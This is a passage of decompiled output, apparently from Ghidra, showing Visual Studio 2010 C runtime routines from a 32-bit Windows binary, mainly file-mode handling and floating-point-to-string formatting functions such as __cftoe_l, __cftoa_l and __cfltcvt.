         ((iVar9 == 0 || (bVar11 != SBORROW4(iVar1,(uint)bVar10)) != iVar9 < 0 && (uVar8 == 0))))
      goto LAB_003bf7ab;
    }
    puVar6 = ___doserrno();
    if (*puVar6 == 5) {
      piVar3 = __errno();
      *piVar3 = 0xd;
    }
    local_14 = 0xffffffff;
    local_10 = 0xffffffff;
LAB_003bf7ab:
    __setmode_nolock(_FileHandle,iVar4);
    DVar14 = 0;
    pvVar2 = GetProcessHeap();
    HeapFree(pvVar2,DVar14,_Buf);
LAB_003bf857:
    if ((local_14 & local_10) == 0xffffffff) goto LAB_003bf759;
  }
  lVar12 = __lseeki64_nolock(_FileHandle,lVar12,0);
  if (lVar12 != -1) {
    return 0;
  }
LAB_003bf759:
  piVar3 = __errno();
  return *piVar3;
}



// Library Function - Single Match
//  __setmode_nolock
// 
// Library: Visual Studio 2010 Release

int __cdecl __setmode_nolock(int _FileHandle,int _Mode)

{
  int *piVar1;
  char cVar2;
  byte bVar3;
  int iVar4;
  byte *pbVar5;
  byte bVar6;
  int iVar7;
  
  piVar1 = &DAT_003ea060 + (_FileHandle >> 5);
  iVar7 = (_FileHandle & 0x1fU) * 0x40;
  iVar4 = *piVar1 + iVar7;
  cVar2 = *(char *)(iVar4 + 0x24);
  bVar3 = *(byte *)(iVar4 + 4);
  if (_Mode == 0x4000) {
    *(byte *)(iVar4 + 4) = *(byte *)(iVar4 + 4) | 0x80;
    pbVar5 = (byte *)(*piVar1 + 0x24 + iVar7);
    *pbVar5 = *pbVar5 & 0x80;
  }
  else {
    if (_Mode == 0x8000) {
      *(byte *)(iVar4 + 4) = *(byte *)(iVar4 + 4) & 0x7f;
    }
    else {
      if ((_Mode == 0x10000) || (_Mode == 0x20000)) {
        *(byte *)(iVar4 + 4) = *(byte *)(iVar4 + 4) | 0x80;
        pbVar5 = (byte *)(*piVar1 + 0x24 + iVar7);
        bVar6 = *pbVar5 & 0x82 | 2;
      }
      else {
        if (_Mode != 0x40000) goto LAB_003bf924;
        *(byte *)(iVar4 + 4) = *(byte *)(iVar4 + 4) | 0x80;
        pbVar5 = (byte *)(*piVar1 + 0x24 + iVar7);
        bVar6 = *pbVar5 & 0x81 | 1;
      }
      *pbVar5 = bVar6;
    }
  }
LAB_003bf924:
  if ((bVar3 & 0x80) == 0) {
    return 0x8000;
  }
  return (-(uint)((char)(cVar2 * '\x02') >> 1 != '\0') & 0xc000) + 0x4000;
}



// Library Function - Single Match
//  __get_fmode
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl __get_fmode(int *_PMode)

{
  int *piVar1;
  
  if (_PMode == (int *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_003b60f9();
    return 0x16;
  }
  *_PMode = DAT_003d8a58;
  return 0;
}



void _release_context(PVOID TargetFrame,PVOID TargetIp,PEXCEPTION_RECORD ExceptionRecord,
                     PVOID ReturnValue)

{
                    // WARNING: Could not recover jumptable at 0x003bf970. Too many branches
                    // WARNING: Treating indirect jump as call
  RtlUnwind(TargetFrame,TargetIp,ExceptionRecord,ReturnValue);
  return;
}



// Library Function - Single Match
//  __cfltcvt_init
// 
// Libraries: Visual Studio 2010 Release, Visual Studio 2012 Release

void __cfltcvt_init(void)

{
  Ptr_003d70d0 = __cfltcvt;
  PTR_LAB_003d70d4 = __cropzeros;
  PTR_LAB_003d70d8 = __fassign;
  PTR_LAB_003d70dc = __forcdecpt;
  PTR_LAB_003d70e0 = __positive;
  PTR_LAB_003d70e4 = __cfltcvt;
  Ptr_003d70e8 = __cfltcvt_l;
  PTR_LAB_003d70ec = __fassign_l;
  Ptr_003d70f0 = __cropzeros_l;
  Ptr_003d70f4 = __forcdecpt_l;
  return;
}



// Library Function - Single Match
//  __fpmath
// 
// Library: Visual Studio 2010 Release

void __cdecl __fpmath(int param_1)

{
  __cfltcvt_init();
  if (param_1 != 0) {
    __setdefaultprecision();
  }
  return;
}



// Library Function - Single Match
//  __forcdecpt_l
// 
// Library: Visual Studio 2010 Release

void __cdecl __forcdecpt_l(char *_Buf,_locale_t _Locale)

{
  byte bVar1;
  byte bVar2;
  int iVar3;
  bool bVar4;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
  iVar3 = _tolower((int)*_Buf);
  bVar4 = iVar3 == 0x65;
  while (!bVar4) {
    _Buf = (char *)((byte *)_Buf + 1);
    iVar3 = _isdigit((uint)(byte)*_Buf);
    bVar4 = iVar3 == 0;
  }
  iVar3 = _tolower((int)*_Buf);
  if (iVar3 == 0x78) {
    _Buf = (char *)((byte *)_Buf + 2);
  }
  bVar2 = *_Buf;
  *_Buf = ***(byte ***)(local_14[0] + 0xbc);
  do {
    _Buf = (char *)((byte *)_Buf + 1);
    bVar1 = *_Buf;
    *_Buf = bVar2;
    bVar2 = bVar1;
  } while (*_Buf != 0);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return;
}



// Library Function - Single Match
//  __cropzeros_l
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __cropzeros_l(char *_Buf,_locale_t _Locale)

{
  char *pcVar1;
  char cVar3;
  int local_14 [2];
  int local_c;
  char local_8;
  char *pcVar2;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
  cVar3 = *_Buf;
  if (cVar3 != '\0') {
    do {
      if (cVar3 == ***(char ***)(local_14[0] + 0xbc)) break;
      _Buf = _Buf + 1;
      cVar3 = *_Buf;
    } while (cVar3 != '\0');
  }
  if (*_Buf != '\0') {
    do {
      _Buf = _Buf + 1;
      cVar3 = *_Buf;
      pcVar1 = _Buf;
      if ((cVar3 == '\0') || (cVar3 == 'e')) break;
    } while (cVar3 != 'E');
    do {
      pcVar2 = pcVar1;
      pcVar1 = pcVar2 + -1;
    } while (*pcVar1 == '0');
    if (*pcVar1 == ***(char ***)(local_14[0] + 0xbc)) {
      pcVar1 = pcVar2 + -2;
    }
    do {
      cVar3 = *_Buf;
      pcVar1 = pcVar1 + 1;
      _Buf = _Buf + 1;
      *pcVar1 = cVar3;
    } while (cVar3 != '\0');
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return;
}



// Library Function - Single Match
//  __positive
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl __positive(double *arg)

{
  if (0.0 < *arg != (*arg == 0.0)) {
    return 1;
  }
  return 0;
}



// Library Function - Single Match
//  __fassign_l
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __fassign_l(int flag,char *argument,char *number,_locale_t param_4)

{
  _CRT_FLOAT local_c;
  undefined4 local_8;
  
  if ((_CRT_FLOAT)flag == (_CRT_FLOAT)0x0) {
    FID_conflict___atoflt_l((_CRT_FLOAT *)&flag,number,param_4);
    *(int *)argument = flag;
  }
  else {
    FID_conflict___atoflt_l(&local_c,number,param_4);
    *(float *)argument = local_c;
    *(undefined4 *)(argument + 4) = local_8;
  }
  return;
}



// Library Function - Single Match
//  __fassign
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __fassign(int flag,char *argument,char *number)

{
  __fassign_l(flag,argument,number,(_locale_t)0x0);
  return;
}



// Library Function - Single Match
//  __shift
// 
// Library: Visual Studio 2010 Release

void __shift(void)

{
  char *in_EAX;
  size_t sVar1;
  int unaff_EDI;
  
  if (unaff_EDI != 0) {
    sVar1 = _strlen(in_EAX);
    FID_conflict__memcpy(in_EAX + unaff_EDI,in_EAX,sVar1 + 1);
  }
  return;
}



// Library Function - Single Match
//  __forcdecpt
// 
// Library: Visual Studio 2010 Release

void __cdecl __forcdecpt(char *_Buf)

{
  __forcdecpt_l(_Buf,(_locale_t)0x0);
  return;
}



// Library Function - Single Match
//  __cropzeros
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __cropzeros(char *_Buf)

{
  __cropzeros_l(_Buf,(_locale_t)0x0);
  return;
}



// Library Function - Single Match
//  __cftoe2_l
// 
// Library: Visual Studio 2010 Release

int __cdecl
__cftoe2_l(uint param_1,int param_2,int param_3,int *param_4,char param_5,localeinfo_struct *param_6
          )

{
  code *pcVar1;
  undefined *in_EAX;
  int *piVar2;
  errno_t eVar3;
  int iVar4;
  undefined *puVar5;
  char *_Dst;
  int iVar6;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,param_6);
  if ((in_EAX == (undefined *)0x0) || (param_1 == 0)) {
    piVar2 = __errno();
    iVar6 = 0x16;
  }
  else {
    iVar6 = param_2;
    if (param_2 < 1) {
      iVar6 = 0;
    }
    if (iVar6 + 9U < param_1) {
      if (param_5 != '\0') {
        __shift();
      }
      puVar5 = in_EAX;
      if (*param_4 == 0x2d) {
        *in_EAX = 0x2d;
        puVar5 = in_EAX + 1;
      }
      if (0 < param_2) {
        *puVar5 = puVar5[1];
        puVar5 = puVar5 + 1;
        *puVar5 = *(undefined *)**(undefined4 **)(local_14[0] + 0xbc);
      }
      _Dst = puVar5 + (uint)(param_5 == '\0') + param_2;
      if (param_1 == 0xffffffff) {
        puVar5 = (undefined *)0xffffffff;
      }
      else {
        puVar5 = in_EAX + (param_1 - (int)_Dst);
      }
      eVar3 = _strcpy_s(_Dst,(rsize_t)puVar5,"e+000");
      if (eVar3 == 0) {
        if (param_3 != 0) {
          *_Dst = 'E';
        }
        if (*(char *)param_4[3] != '0') {
          iVar6 = param_4[1] + -1;
          if (iVar6 < 0) {
            iVar6 = -iVar6;
            _Dst[1] = '-';
          }
          if (99 < iVar6) {
            iVar4 = iVar6 / 100;
            iVar6 = iVar6 % 100;
            _Dst[2] = _Dst[2] + (char)iVar4;
          }
          if (9 < iVar6) {
            iVar4 = iVar6 / 10;
            iVar6 = iVar6 % 10;
            _Dst[3] = _Dst[3] + (char)iVar4;
          }
          _Dst[4] = _Dst[4] + (char)iVar6;
        }
        if (((DAT_003ea040 & 1) != 0) && (_Dst[2] == '0')) {
          FID_conflict__memcpy(_Dst + 2,_Dst + 3,3);
        }
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        return 0;
      }
      __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      pcVar1 = (code *)swi(3);
      iVar6 = (*pcVar1)();
      return iVar6;
    }
    piVar2 = __errno();
    iVar6 = 0x22;
  }
  *piVar2 = iVar6;
  FUN_003b60f9();
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar6;
}



// WARNING: Type propagation algorithm not settling
// Library Function - Single Match
//  __cftoe_l
// 
// Library: Visual Studio 2010 Release

void __cdecl
__cftoe_l(_CRT_DOUBLE *param_1,undefined *param_2,uint param_3,int param_4,int param_5,
         localeinfo_struct *param_6)

{
  int *piVar1;
  size_t _SizeInBytes;
  errno_t eVar2;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 uVar3;
  undefined uVar4;
  int in_stack_ffffffd0;
  char local_20 [24];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  __fltout2((_CRT_DOUBLE)param_1->x,(STRFLT)&stack0xffffffd0,local_20,0x16);
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    piVar1 = __errno();
    uVar4 = (undefined)in_stack_ffffffd0;
    *piVar1 = 0x16;
    FUN_003b60f9();
    uVar3 = extraout_EDX;
  }
  else {
    _SizeInBytes = param_3;
    if (param_3 != 0xffffffff) {
      _SizeInBytes = (param_3 - (in_stack_ffffffd0 == 0x2d)) - (uint)(0 < param_4);
    }
    eVar2 = __fptostr(param_2 + (uint)(0 < param_4) + (uint)(in_stack_ffffffd0 == 0x2d),_SizeInBytes
                      ,param_4 + 1,(STRFLT)&stack0xffffffd0);
    uVar4 = (undefined)in_stack_ffffffd0;
    if (eVar2 == 0) {
      __cftoe2_l(param_3,param_4,param_5,(int *)&stack0xffffffd0,'\0',param_6);
      uVar3 = extraout_EDX_01;
    }
    else {
      *param_2 = 0;
      uVar3 = extraout_EDX_00;
    }
  }
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar3,uVar4);
  return;
}



// Library Function - Single Match
//  __cftoe
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl __cftoe(double *_Value,char *_Buf,size_t _SizeInBytes,int _Dec,int _Caps)

{
  errno_t eVar1;
  
  eVar1 = __cftoe_l((_CRT_DOUBLE *)_Value,_Buf,_SizeInBytes,_Dec,_Caps,(localeinfo_struct *)0x0);
  return eVar1;
}



// WARNING: Could not reconcile some variable overlaps
// Library Function - Single Match
//  __cftoa_l
// 
// Library: Visual Studio 2010 Release

int __cdecl
__cftoa_l(double *param_1,undefined *param_2,size_t param_3,uint param_4,int param_5,
         localeinfo_struct *param_6)

{
  undefined (*pauVar1) [16];
  ushort uVar2;
  int *piVar3;
  errno_t eVar4;
  char *pcVar5;
  undefined (*pauVar6) [16];
  uint uVar7;
  uint uVar8;
  uint extraout_ECX;
  uint extraout_ECX_00;
  uint extraout_ECX_01;
  uint uVar9;
  short sVar10;
  undefined (*pauVar11) [16];
  undefined (*lorem_ipsum) [16];
  char *pcVar12;
  bool bVar13;
  ulonglong uVar14;
  undefined8 uVar15;
  int iVar16;
  int local_28 [2];
  int local_20;
  char local_1c;
  uint local_18;
  undefined4 local_14;
  uint local_10;
  uint local_c;
  int local_8;
  
  local_18 = 0x3ff;
  local_8 = 0x30;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_28,param_6);
  if ((int)param_4 < 0) {
    param_4 = 0;
  }
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    piVar3 = __errno();
    iVar16 = 0x16;
LAB_003bfe25:
    *piVar3 = iVar16;
    FUN_003b60f9();
    if (local_1c != '\0') {
      *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
    }
    return iVar16;
  }
  *param_2 = 0;
  if (param_3 <= param_4 + 0xb) {
    piVar3 = __errno();
    iVar16 = 0x22;
    goto LAB_003bfe25;
  }
  local_10 = *(uint *)param_1;
  if ((*(uint *)((int)param_1 + 4) >> 0x14 & 0x7ff) == 0x7ff) {
    if (param_3 != 0xffffffff) {
      param_3 = param_3 - 2;
    }
    eVar4 = __cftoe(param_1,param_2 + 2,param_3,param_4,0);
    if (eVar4 != 0) {
      *param_2 = 0;
      if (local_1c == '\0') {
        return eVar4;
      }
      *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      return eVar4;
    }
    if (param_2[2] == '-') {
      *param_2 = 0x2d;
      param_2 = param_2 + 1;
    }
    *param_2 = 0x30;
    param_2[1] = ((param_5 == 0) - 1U & 0xe0) + 0x78;
    pcVar5 = _strrchr(param_2 + 2,0x65);
    if (pcVar5 != (char *)0x0) {
      *pcVar5 = ((param_5 == 0) - 1U & 0xe0) + 0x70;
      pcVar5[3] = '\0';
    }
    goto LAB_003c014c;
  }
  if ((*(uint *)((int)param_1 + 4) & 0x80000000) != 0) {
    *param_2 = 0x2d;
    param_2 = param_2 + 1;
  }
  *param_2 = 0x30;
  param_2[1] = ((param_5 == 0) - 1U & 0xe0) + 0x78;
  sVar10 = (-(ushort)(param_5 != 0) & 0xffe0) + 0x27;
  if ((*(uint *)((int)param_1 + 4) & 0x7ff00000) == 0) {
    param_2[2] = 0x30;
    if ((*(uint *)param_1 | *(uint *)((int)param_1 + 4) & 0xfffff) == 0) {
      local_18 = 0;
    }
    else {
      local_18 = 0x3fe;
    }
  }
  else {
    param_2[2] = 0x31;
  }
  pauVar11 = (undefined (*) [16])(param_2 + 3);
  lorem_ipsum = (undefined (*) [16])(param_2 + 4);
  if (param_4 == 0) {
    (*pauVar11)[0] = 0;
  }
  else {
    (*pauVar11)[0] = *(undefined *)**(undefined4 **)(local_28[0] + 0xbc);
  }
  local_c = *(uint *)((int)param_1 + 4) & 0xfffff;
  if ((local_c != 0) || (*(int *)param_1 != 0)) {
    local_10 = 0;
    local_c = 0xf0000;
    do {
      if ((int)param_4 < 1) break;
      uVar14 = __aullshr((byte)local_8,*(uint *)((int)param_1 + 4) & local_c & 0xfffff);
      uVar2 = (short)uVar14 + 0x30;
      if (0x39 < uVar2) {
        uVar2 = uVar2 + sVar10;
      }
      local_8 = local_8 + -4;
      (*lorem_ipsum)[0] = (char)uVar2;
      local_10 = local_10 >> 4 | local_c << 0x1c;
      local_c = local_c >> 4;
      lorem_ipsum = (undefined (*) [16])(*lorem_ipsum + 1);
      param_4 = param_4 - 1;
    } while (-1 < (short)local_8);
    if ((-1 < (short)local_8) &&
       (uVar14 = __aullshr((byte)local_8,*(uint *)((int)param_1 + 4) & local_c & 0xfffff),
       pauVar1 = lorem_ipsum, 8 < (ushort)uVar14)) {
      while( true ) {
        pauVar6 = (undefined (*) [16])(pauVar1[-1] + 0xf);
        if (((*pauVar6)[0] != 'f') && ((*pauVar6)[0] != 'F')) break;
        (*pauVar6)[0] = 0x30;
        pauVar1 = pauVar6;
      }
      if (pauVar6 == pauVar11) {
        pauVar1[-1][0xe] = pauVar1[-1][0xe] + '\x01';
      }
      else {
        if ((*pauVar6)[0] == '9') {
          (*pauVar6)[0] = (char)sVar10 + ':';
        }
        else {
          (*pauVar6)[0] = (*pauVar6)[0] + '\x01';
        }
      }
    }
  }
  if (0 < (int)param_4) {
    trim_string(lorem_ipsum,0x30,param_4);
    lorem_ipsum = (undefined (*) [16])(*lorem_ipsum + param_4);
  }
  if ((*pauVar11)[0] == '\0') {
    lorem_ipsum = pauVar11;
  }
  (*lorem_ipsum)[0] = ((param_5 == 0) - 1U & 0xe0) + 0x70;
  uVar14 = __aullshr(0x34,*(uint *)((int)param_1 + 4));
  uVar7 = (uint)(uVar14 & 0x7ff);
  uVar8 = uVar7 - local_18;
  uVar7 = (uint)(uVar7 < local_18);
  uVar9 = -uVar7;
  if (uVar7 == 0) {
    (*lorem_ipsum)[1] = 0x2b;
  }
  else {
    (*lorem_ipsum)[1] = 0x2d;
    bVar13 = uVar8 != 0;
    uVar8 = -uVar8;
    uVar9 = -(uVar9 + bVar13);
  }
  pcVar12 = *lorem_ipsum + 2;
  *pcVar12 = '0';
  pcVar5 = pcVar12;
  if (((int)uVar9 < 0) || (((int)uVar9 < 1 && (uVar8 < 1000)))) {
LAB_003c00fb:
    if ((-1 < (int)uVar9) && ((0 < (int)uVar9 || (99 < uVar8)))) goto LAB_003c0106;
  }
  else {
    uVar15 = __alldvrm(uVar8,uVar9,1000,0);
    local_14 = (undefined4)((ulonglong)uVar15 >> 0x20);
    *pcVar12 = (char)uVar15 + '0';
    pcVar5 = *lorem_ipsum + 3;
    uVar9 = 0;
    uVar8 = extraout_ECX;
    if (pcVar5 == pcVar12) goto LAB_003c00fb;
LAB_003c0106:
    uVar15 = __alldvrm(uVar8,uVar9,100,0);
    local_14 = (undefined4)((ulonglong)uVar15 >> 0x20);
    *pcVar5 = (char)uVar15 + '0';
    pcVar5 = pcVar5 + 1;
    uVar9 = 0;
    uVar8 = extraout_ECX_00;
  }
  if ((pcVar5 != pcVar12) || ((-1 < (int)uVar9 && ((0 < (int)uVar9 || (9 < uVar8)))))) {
    uVar15 = __alldvrm(uVar8,uVar9,10,0);
    *pcVar5 = (char)uVar15 + '0';
    pcVar5 = pcVar5 + 1;
    uVar8 = extraout_ECX_01;
  }
  *pcVar5 = (char)uVar8 + '0';
  pcVar5[1] = '\0';
LAB_003c014c:
  if (local_1c != '\0') {
    *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
  }
  return 0;
}



// Library Function - Single Match
//  __cftof2_l
// 
// Library: Visual Studio 2010 Release

undefined4 __thiscall
__cftof2_l(void *this,int param_1,uint param_2,char param_3,localeinfo_struct *param_4)

{
  int iVar1;
  int *in_EAX;
  int *piVar2;
  size_t sVar3;
  undefined4 uVar4;
  char *_Str;
  int local_14 [2];
  int local_c;
  char local_8;
  
  iVar1 = in_EAX[1];
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,param_4);
  if ((this == (void *)0x0) || (param_1 == 0)) {
    piVar2 = __errno();
    uVar4 = 0x16;
    *piVar2 = 0x16;
    FUN_003b60f9();
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
  }
  else {
    if ((param_3 != '\0') && (iVar1 - 1U == param_2)) {
      *(undefined2 *)((uint)(*in_EAX == 0x2d) + (iVar1 - 1U) + (int)this) = 0x30;
    }
    if (*in_EAX == 0x2d) {
      *(undefined *)this = 0x2d;
      this = (void *)((int)this + 1);
    }
    if (in_EAX[1] < 1) {
      _Str = (char *)((int)this + 1);
      sVar3 = _strlen((char *)this);
      FID_conflict__memcpy(_Str,this,sVar3 + 1);
      *(char *)this = '0';
    }
    else {
      _Str = (char *)((int)this + in_EAX[1]);
    }
    if (0 < (int)param_2) {
      sVar3 = _strlen(_Str);
      FID_conflict__memcpy((undefined (*) [16])(_Str + 1),_Str,sVar3 + 1);
      *_Str = ***(char ***)(local_14[0] + 0xbc);
      iVar1 = in_EAX[1];
      if (iVar1 < 0) {
        if ((param_3 != '\0') || (SBORROW4(param_2,-iVar1) == (int)(param_2 + iVar1) < 0)) {
          param_2 = -iVar1;
        }
        __shift();
        trim_string((undefined (*) [16])(_Str + 1),0x30,param_2);
      }
    }
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    uVar4 = 0;
  }
  return uVar4;
}



// WARNING: Type propagation algorithm not settling
// Library Function - Single Match
//  __cftof_l
// 
// Library: Visual Studio 2010 Release

void __cdecl
__cftof_l(_CRT_DOUBLE *param_1,undefined *param_2,int param_3,uint param_4,
         localeinfo_struct *param_5)

{
  int *piVar1;
  size_t _SizeInBytes;
  errno_t eVar2;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 uVar3;
  undefined uVar4;
  int in_stack_ffffffd0;
  int local_2c;
  char local_20 [24];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  __fltout2((_CRT_DOUBLE)param_1->x,(STRFLT)&stack0xffffffd0,local_20,0x16);
  if (param_2 == (undefined *)0x0) {
    piVar1 = __errno();
    uVar4 = (undefined)in_stack_ffffffd0;
    *piVar1 = 0x16;
    FUN_003b60f9();
    uVar3 = extraout_EDX;
  }
  else {
    if (param_3 == 0) {
      piVar1 = __errno();
      uVar4 = (undefined)in_stack_ffffffd0;
      *piVar1 = 0x16;
      FUN_003b60f9();
      uVar3 = extraout_EDX_00;
    }
    else {
      _SizeInBytes = 0xffffffff;
      if (param_3 != -1) {
        _SizeInBytes = param_3 - (uint)(in_stack_ffffffd0 == 0x2d);
      }
      eVar2 = __fptostr(param_2 + (in_stack_ffffffd0 == 0x2d),_SizeInBytes,local_2c + param_4,
                        (STRFLT)&stack0xffffffd0);
      uVar4 = (undefined)in_stack_ffffffd0;
      if (eVar2 == 0) {
        __cftof2_l(param_2,param_3,param_4,'\0',param_5);
        uVar3 = extraout_EDX_02;
      }
      else {
        *param_2 = 0;
        uVar3 = extraout_EDX_01;
      }
    }
  }
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar3,uVar4);
  return;
}



// WARNING: Removing unreachable block (ram,0x003c03c2)
// WARNING: Removing unreachable block (ram,0x003c03c9)
// WARNING: Type propagation algorithm not settling
// Library Function - Single Match
//  __cftog_l
// 
// Library: Visual Studio 2010 Release

void __cdecl
__cftog_l(_CRT_DOUBLE *param_1,undefined *param_2,uint param_3,uint param_4,int param_5,
         localeinfo_struct *param_6)

{
  int *piVar1;
  errno_t eVar2;
  size_t _SizeInBytes;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 uVar3;
  undefined uVar4;
  int in_stack_ffffffd0;
  int local_2c;
  char local_20 [24];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  __fltout2((_CRT_DOUBLE)param_1->x,(STRFLT)&stack0xffffffd0,local_20,0x16);
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    piVar1 = __errno();
    uVar4 = (undefined)in_stack_ffffffd0;
    *piVar1 = 0x16;
    FUN_003b60f9();
    uVar3 = extraout_EDX;
  }
  else {
    _SizeInBytes = param_3;
    if (param_3 != 0xffffffff) {
      _SizeInBytes = param_3 - (in_stack_ffffffd0 == 0x2d);
    }
    eVar2 = __fptostr(param_2 + (in_stack_ffffffd0 == 0x2d),_SizeInBytes,param_4,
                      (STRFLT)&stack0xffffffd0);
    uVar4 = (undefined)in_stack_ffffffd0;
    if (eVar2 == 0) {
      if ((local_2c + -1 < -4) || ((int)param_4 <= local_2c + -1)) {
        __cftoe2_l(param_3,param_4,param_5,(int *)&stack0xffffffd0,'\x01',param_6);
        uVar3 = extraout_EDX_02;
      }
      else {
        __cftof2_l(param_2,param_3,param_4,'\x01',param_6);
        uVar3 = extraout_EDX_01;
      }
    }
    else {
      *param_2 = 0;
      uVar3 = extraout_EDX_00;
    }
  }
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar3,uVar4);
  return;
}



// Library Function - Single Match
//  __cfltcvt_l
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl
__cfltcvt_l(double *arg,char *buffer,size_t sizeInBytes,int format,int precision,int caps,
           _locale_t plocinfo)

{
  errno_t eVar1;
  
  if ((format == 0x65) || (format == 0x45)) {
    eVar1 = __cftoe_l((_CRT_DOUBLE *)arg,buffer,sizeInBytes,precision,caps,plocinfo);
  }
  else {
    if (format == 0x66) {
      eVar1 = __cftof_l((_CRT_DOUBLE *)arg,buffer,sizeInBytes,precision,plocinfo);
      return eVar1;
    }
    if ((format == 0x61) || (format == 0x41)) {
      eVar1 = __cftoa_l(arg,buffer,sizeInBytes,precision,caps,plocinfo);
    }
    else {
      eVar1 = __cftog_l((_CRT_DOUBLE *)arg,buffer,sizeInBytes,precision,caps,plocinfo);
    }
  }
  return eVar1;
}



// Library Function - Single Match
//  __cfltcvt
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release,
// Visual Studio 2012 Release

errno_t __cdecl
__cfltcvt(double *arg,char *buffer,size_t sizeInBytes,int format,int precision,int caps)

{
  errno_t eVar1;
  
  eVar1 = __cfltcvt_l(arg,buffer,sizeInBytes,format,precision,caps,(_locale_t)0x0);
  return eVar1;
}



// Library Function - Single Match
//  __setdefaultprecision
// 
// Library: Visual Studio 2010 Release

void __setdefaultprecision(void)

{
  errno_t eVar1;
  
  eVar1 = __controlfp_s((uint *)0x0,0x10000,0x30000);
  if (eVar1 != 0) {
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return;
}



// Library Function - Single Match
//  _strrchr
// 
// Library: Visual Studio 2010 Release

char * __cdecl _strrchr(char *_Str,int _Ch)

{
  char cVar1;
  int iVar2;
  char *pcVar3;
  char *pcVar4;
  
  iVar2 = -1;
  do {
    pcVar4 = _Str;
    if (iVar2 == 0) break;
    iVar2 = iVar2 + -1;
    pcVar4 = _Str + 1;
    cVar1 = *_Str;
    _Str = pcVar4;
  } while (cVar1 != '\0');
  iVar2 = -(iVar2 + 1);
  pcVar4 = pcVar4 + -1;
  do {
    pcVar3 = pcVar4;
    if (iVar2 == 0) break;
    iVar2 = iVar2 + -1;
    pcVar3 = pcVar4 + -1;
    cVar1 = *pcVar4;
    pcVar4 = pcVar3;
  } while ((char)_Ch != cVar1);
  pcVar3 = pcVar3 + 1;
  if (*pcVar3 != (char)_Ch) {
    pcVar3 = (char *)0x0;
  }
  return pcVar3;
}



// Library Function - Multiple Matches With Different Base Names
//  __atodbl_l
//  __atoflt_l
// 
// Library: Visual Studio 2010 Release

int __cdecl FID_conflict___atoflt_l(_CRT_FLOAT *_Result,char *_Str,_locale_t _Locale)

{
  INTRNCVT_STATUS IVar1;
  int iVar2;
  undefined4 extraout_EDX;
  undefined in_stack_ffffffd4;
  localeinfo_struct local_28;
  int local_20;
  char local_1c;
  uint local_18;
  _LDBL12 local_14;
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_28,_Locale);
  local_18 = ___strgtold12_l(&local_14,(char **)&stack0xffffffd4,_Str,0,0,0,0,(_locale_t)&local_28);
  IVar1 = FID_conflict___ld12tod(&local_14,(_CRT_DOUBLE *)_Result);
  if ((local_18 & 3) == 0) {
    if (IVar1 == INTRNCVT_OVERFLOW) {
LAB_003c0576:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_003c05b6;
    }
    if (IVar1 != INTRNCVT_UNDERFLOW) {
LAB_003c05a8:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_003c05b6;
    }
  }
  else {
    if ((local_18 & 1) == 0) {
      if ((local_18 & 2) == 0) goto LAB_003c05a8;
      goto LAB_003c0576;
    }
  }
